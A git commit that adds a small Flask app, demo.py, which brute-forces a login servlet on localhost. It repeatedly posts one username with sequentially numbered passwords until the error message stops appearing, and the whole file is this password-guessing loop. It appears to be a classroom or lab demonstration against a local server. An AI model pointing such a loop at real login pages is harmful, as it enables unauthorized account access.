ab1526d89bdeb881a98d50c713e0fd148266bc19
Devershi Chandra <devershichandra27@gmail.com>
2017-04-20 11:47:55 +0530

    Added flask server for brute Force

---
+++ demo.py
@@ -0,0 +1,31 @@
+from flask import Flask, request, render_template
+import requests
+
+app = Flask(__name__)
+
+@app.route('/demo', methods=['GET','POST'])
+def bruteForce():
+	url = "http://localhost:8080/session/LoginServlet"
+	br = {}
+	br["name"] = "Devershi"
+	i = 120
+	while True:
+		br["password"] = str("Gmail@")+str(i)
+		print 'Now trying password ' + br["password"]
+		r = requests.post(url, br)
+		response_file = "./templates/results.html"
+		with open(response_file, "w") as f:
+			f.write(r.content)
+		data = ""
+		with open(response_file, 'r') as myfile:
+			data = myfile.read().replace('\n', ' ')
+		if "Sorry, username or password error!/" in  data:
+			print 'Failed for password ' + br["password"]
+			i+=1
+			data = ""
+		else:
+			break
+		print 'howdy'
+	return render_template('results.html')
+if __name__ == '__main__':
+	app.run()
